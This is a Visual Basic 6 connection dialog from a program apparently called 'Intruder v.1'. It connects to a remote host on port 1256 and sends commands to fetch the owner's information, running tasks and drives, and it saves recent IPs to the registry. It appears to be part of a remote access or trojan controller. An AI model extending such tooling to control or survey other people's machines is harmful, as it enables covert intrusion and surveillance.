VERSION 5.00
Begin VB.Form frmChooseConn 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Choose Host"
   ClientHeight    =   1020
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3570
   Icon            =   "frmChooseConn.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MDIChild        =   -1  'True
   MinButton       =   0   'False
   ScaleHeight     =   1020
   ScaleWidth      =   3570
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox txtPort 
      BackColor       =   &H00404040&
      ForeColor       =   &H0000C000&
      Height          =   285
      Left            =   120
      TabIndex        =   3
      Text            =   "1256"
      Top             =   600
      Width           =   2295
   End
   Begin VB.ComboBox Combo1 
      BackColor       =   &H00404040&
      ForeColor       =   &H0000FF00&
      Height          =   315
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   2295
   End
   Begin VB.CommandButton cmdCancel 
      Caption         =   "&Cancel"
      Height          =   375
      Left            =   2520
      TabIndex        =   1
      Top             =   600
      Width           =   975
   End
   Begin VB.CommandButton cmdConnect 
      Caption         =   "&Connect"
      Height          =   375
      Left            =   2520
      TabIndex        =   0
      Top             =   120
      Width           =   975
   End
End
Attribute VB_Name = "frmChooseConn"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub cmdCancel_Click()
    Unload Me
End Sub

Private Sub cmdConnect_Click()
    Dim iList As Integer, FoundIt As Boolean
    If Combo1.Text = "" Then Exit Sub
    'try and make the connection with the client program
    bReplied = False
    
    frmClient.tcpClient.Connect Combo1, CInt(txtPort)
    lTime = 0
     ' Give a little time to respond
    While (Not bReplied) And (lTime < 700000)
        DoEvents
        lTime = lTime + 1
    Wend
    
    If lTime >= 700000 Then
        'Didn't reply or timed out. close the connection
        MsgBox "Unable to connect to server", vbCritical, "Intruder v.1"
        
       Logit NoConn
        
        frmClient.tcpClient.Close
        Exit Sub
       Else
      
        FoundIt = False
       ' do the IP List
       For iList = 1 To Combo1.ListCount - 1
            If Combo1.List(iList) = Combo1.Text Then
                FoundIt = True
                Exit For
            End If
        Next iList
        
        If Not FoundIt Then Combo1.AddItem Combo1.Text
    End If
    
    With frmClient
      .mnuTasks.Enabled = True
      .imgConnStatus = frmClient.img1
      .cmdEMail.Enabled = True
      .cmdServer.Enabled = True
      .Timer1.Enabled = True
      With frmTskManager
        .SSTab1.TabEnabled(0) = True
        .SSTab1.TabEnabled(1) = True
        .SSTab1.TabEnabled(2) = True
      End With
    End With
    
      With frmClient.Toolbar1
        .Buttons(3).Enabled = True
        .Buttons(5).Enabled = True
        .Buttons(6).Enabled = True
        .Buttons(7).Enabled = True
      End With
      
      
      CurrentIP = Combo1
      
      frmTskManager.SB.Panels(1).Text = "  Retrieving Running Apps..."
      
      SendData "Get_Owner_Info,"
      Pause 2000
      SendData "Get_Tasks,"
      Pause 1000
      SendData "Get_Drives,"
      
      
    Unload Me
End Sub

Private Sub Form_Load()
    Dim ConList As String
    
    bReplied = False
    'Get the connection and port lists from the registry
    ConList = GetSetting(App.Title, "Settings", "ConnectionList", "")
    'Update the combo box with recent IP addresses used
    UpdateCMB Combo1, ConList
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Dim ConList As String
    
    ConList = GetCMB(Combo1)
    'Write the recent IP address to the registry
    SaveSetting App.Title, "Settings", "ConnectionList", ConList
End Sub
